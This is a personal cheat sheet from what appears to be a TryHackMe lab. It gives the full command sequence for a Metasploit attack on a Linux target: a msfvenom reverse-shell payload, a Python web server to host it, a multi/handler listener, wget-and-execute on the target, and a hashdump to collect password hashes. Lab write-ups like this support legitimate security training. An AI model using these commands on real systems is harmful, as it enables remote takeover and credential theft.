## Msfvenom Cheat Sheet

### Setup - 3 Terminals Needed

- Terminal 1 - AttackBox: create payload + run web server
- Terminal 2 - AttackBox: msfconsole handler listener
- Terminal 3 - SSH into target machine

To get into the target machine i neded the following

ssh murphy@target ip here
password: I had one provided by THM

sudo su
This gives me root access on the target machine.

---

If I need to get control over a target Linux machine,
I start by creating a payload on my AttackBox:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f elf > shell.elf

This creates a malicious Linux executable that will
connect back to my machine when executed on the target.
MY_IP and LPORT tell it where to call home.
Run this from the /root directory.

---

Then I host the file so the target can download it.
Run this in Terminal 1 from /root directory:

cd /root
python3 -m http.server 9000

This turns my machine into a temporary web server
hosting the payload file.

---

In Terminal 2 I set up a listener before running anything:

msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST my ip
set LPORT 4444
run -j

Like picking up the phone before someone calls.
If nobody is listening the connection just disappears.
The -j flag keeps it running as a background job.

---

In Terminal 3 (SSH on target) I download and prep the file:

wget http://MY_IP:9000/shell.elf
chmod +x shell.elf

wget grabs the file from my web server.
chmod +x makes it executable.
Without that second command it won't run.

---

Now I run the payload on the target:

./shell.elf &

This triggers the connection back to my listener.
The & keeps it running in the background. I had to use it, 
for some reason in kept kicking me out without it.
I now have a Meterpreter session - full control.

---

To grab password hashes from inside the machine:

run post/linux/gather/hashdump

Pulls stored password hashes which can be
cracked later to reveal actual passwords, 
but I just needed it to complete the room

---

### Things That Went Wrong

404 error when target tries to download the file:
Web server was not running from the same folder as shell.elf.
Fix: cd /root first, then start the web server from there
first couple of times I just had typos, like the wrong port instead of 9000
I had 99000 and wrong ip for the server
